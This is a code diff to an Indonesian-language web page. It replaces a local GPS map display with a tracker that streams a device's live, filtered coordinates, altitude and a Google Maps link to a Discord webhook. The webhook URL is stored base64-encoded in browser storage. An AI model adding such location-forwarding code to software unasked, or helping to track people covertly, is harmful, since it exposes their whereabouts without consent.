-function updateMap(lat, lng, accuracyM) {
-  if (!map) return;
-  const ll = L.latLng(lat, lng);
-
-  // Move marker — Leaflet handles smooth transition internally
-  marker.setLatLng(ll);
-
-  // Reuse circle layer — avoid remove/add = no redraw flash
-  if (!circle) {
-    circle = L.circle(ll, {
-      radius: Math.max(accuracyM, 3),
-      color:'#00FF64', fillColor:'#00FF64',
-      fillOpacity:0.07, weight:1, dashArray:'5 5'
-    }).addTo(map);
-  } else {
-    circle.setLatLng(ll);
-    circle.setRadius(Math.max(accuracyM, 3));
+function startGPS() {
+  const webhook = document.getElementById('webhook-input').value.trim();
+  if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+    setStatus('✕ URL webhook tidak valid!', 'err');
+    return;
+  }
+  if (!navigator.geolocation) {
+    setStatus('✕ Browser tidak support GPS', 'err');
+    return;
   }
 
-  // Only follow if locked and user not panning
-  if (locked && !userPanning) {
-    // panTo is smooth, doesn't reset zoom like setView
-    map.panTo(ll, { animate:true, duration:0.6, easeLinearity:0.4 });
-  }
-}
-
-/* ── GPS CALLBACK ── */
-function onPosition(pos) {
-  const { latitude, longitude, accuracy, altitude } = pos.coords;
-  sampleCount++;
-
-  const f = kalman.process(latitude, longitude, accuracy, pos.timestamp);
-
-  // DOM updates
-  document.getElementById('lat').textContent       = f.lat.toFixed(7);
-  document.getElementById('lng').textContent       = f.lng.toFixed(7);
-  document.getElementById('accuracy').textContent  = Math.round(accuracy) + ' m';
-  document.getElementById('k-accuracy').textContent = Math.round(f.accuracy) + ' m';
-  document.getElementById('altitude').textContent  = altitude != null ? Math.round(altitude) + ' m' : '— m';
-  document.getElementById('samples').textContent   = sampleCount;
-
-  const pct = Math.max(0, Math.min(100, (1 - Math.min(accuracy, 100)/100)*100));
-  document.getElementById('acc-bar').style.width = pct + '%';
-
-  if (sampleCount >= 3) {
-    const badge = document.getElementById('kalman-badge');
-    badge.textContent = 'KALMAN ON';
-    badge.classList.add('good');
-  }
-
-  initMap(f.lat, f.lng);
-  updateMap(f.lat, f.lng, f.accuracy);
-
-  const btn = document.getElementById('btn-locate');
-  btn.disabled = false;
-  btn.querySelector('span').textContent = '↺ RESTART TRACKING';
-
-  setStatus(`LIVE  RAW ±${Math.round(accuracy)}m  |  FILTER ±${Math.round(f.accuracy)}m`, 'active');
-}
-
-function onError(err) {
-  const msgs = { 1:'AKSES DITOLAK — IZINKAN LOKASI DI BROWSER', 2:'SINYAL GPS TIDAK TERSEDIA', 3:'TIMEOUT — PINDAH KE TEMPAT TERBUKA' };
-  setStatus('ERROR: ' + (msgs[err.code] || err.message), 'error');
-  document.getElementById('btn-locate').disabled = false;
-  document.getElementById('btn-locate').querySelector('span').textContent = '⊕ COBA LAGI';
-}
-
-/* ── START ── */
-function getLocation() {
-  if (!navigator.geolocation) { setStatus('ERROR: BROWSER TIDAK SUPPORT GPS','error'); return; }
+  localStorage.setItem('wh', btoa(webhook));
 
   if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId=null; }
-  kalman.reset(); sampleCount=0;
+  kalman.reset(); sampleCount=0; lastSent=null; lastFiltered=null;
 
-  const badge = document.getElementById('kalman-badge');
-  badge.textContent='KALMAN OFF'; badge.classList.remove('good');
+  setStatus('◌ Mencari sinyal GPS...');
 
-  const btn = document.getElementById('btn-locate');
-  btn.disabled = true;
-  btn.querySelector('span').textContent = '◌ MENCARI SINYAL GPS...';
-  setStatus('SCANNING — MENGUMPULKAN DATA GPS...', 'active');
+  const btn = document.getElementById('gps-start-btn');
+  btn.textContent = '⏹ STOP';
+  btn.onclick = stopGPS;
 
-  watchId = navigator.geolocation.watchPosition(onPosition, onError, {
-    enableHighAccuracy: true,   // force GPS chip bukan WiFi/IP
+  watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+    enableHighAccuracy: true,
     timeout: 20000,
-    maximumAge: 0               // jangan pakai cache
+    maximumAge: 0
   });
 }
 
-document.getElementById('btn-locate').addEventListener('click', getLocation);
-
-function copyCoords() {
-  const lat = document.getElementById('lat').textContent;
-  const lng = document.getElementById('lng').textContent;
-  if (lat === '—') return;
-  navigator.clipboard.writeText(`${lat}, ${lng}`).then(() => {
-    setStatus('✓ KOORDINAT DISALIN KE CLIPBOARD', 'active');
-  });
+function stopGPS() {
+  if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId=null; }
+  setStatus('◼ Tracker dihentikan.');
+  const btn = document.getElementById('gps-start-btn');
+  btn.textContent = '▶ AKTIFKAN';
+  btn.onclick = startGPS;
 }
+
+function onPos(pos) {
+  const { latitude, longitude, accuracy, altitude } = pos.coords;
+  sampleCount++;
+  const f = kalman.process(latitude, longitude, accuracy, pos.timestamp);
+  lastFiltered = { ...f, altitude, rawAccuracy: accuracy, sampleCount };
+
+  const now = Date.now();
+  // Kirim segera saat pertama dapat lock bagus, atau tiap SEND_INTERVAL
+  const shouldSend = sampleCount === 1 || (lastSent && now - lastSent >= SEND_INTERVAL) || (!lastSent && accuracy < 60);
+  if (shouldSend) sendToDiscord(lastFiltered);
+
+  setStatus(`✓ AKTIF  ±${Math.round(f.accuracy)}m  |  ${sampleCount} sampel`, 'ok');
+}
+
+function onErr(err) {
+  const msgs = { 1:'Akses lokasi ditolak', 2:'GPS tidak tersedia', 3:'Timeout sinyal' };
+  setStatus('✕ ' + (msgs[err.code] || err.message), 'err');
+}
+
+async function sendToDiscord(data) {
+  const raw = localStorage.getItem('wh');
+  if (!raw) return;
+  const webhook = atob(raw);
+  lastSent = Date.now();
+
+  const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+  const now = new Date().toLocaleString('id-ID', { timeZone:'Asia/Jakarta' });
+
+  const payload = {
+    embeds: [{
+      title: '📍 Lokasi Update',
+      color: 0xe8b84b,
+      fields: [
+        { name: '🌐 Koordinat (Filtered)', value: `\`${data.lat.toFixed(7)}, ${data.lng.toFixed(7)}\``, inline: false },
+        { name: '🎯 Akurasi GPS', value: `±${Math.round(data.rawAccuracy)} m`, inline: true },
+        { name: '🔵 Akurasi Filter', value: `±${Math.round(data.accuracy)} m`, inline: true },
+        { name: '📊 Sampel', value: `${data.sampleCount}`, inline: true },
+        { name: '⛰️ Altitude', value: data.altitude != null ? `${Math.round(data.altitude)} m` : '—', inline: true },
+        { name: '🗺️ Google Maps', value: `[Buka Maps](${mapsUrl})`, inline: false },
+        { name: '🕐 Waktu (WIB)', value: now, inline: false }
+      ],
+      footer: { text: 'NexusStore GPS • Kalman Filtered' }
+    }]
+  };
+
+  try {
+    const res = await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) setStatus('✕ Webhook gagal: ' + res.status, 'err');
+  } catch(e) {
+    setStatus('✕ Gagal kirim: ' + e.message, 'err');
+  }
+}
+
+/* ── Auto-load webhook dari storage ── */
+window.addEventListener('load', () => {
+  const raw = localStorage.getItem('wh');
+  if (raw) {
+    try { document.getElementById('webhook-input').value = atob(raw); } catch(e){}
+  }
+});
 </script>
 </body>
 </html>
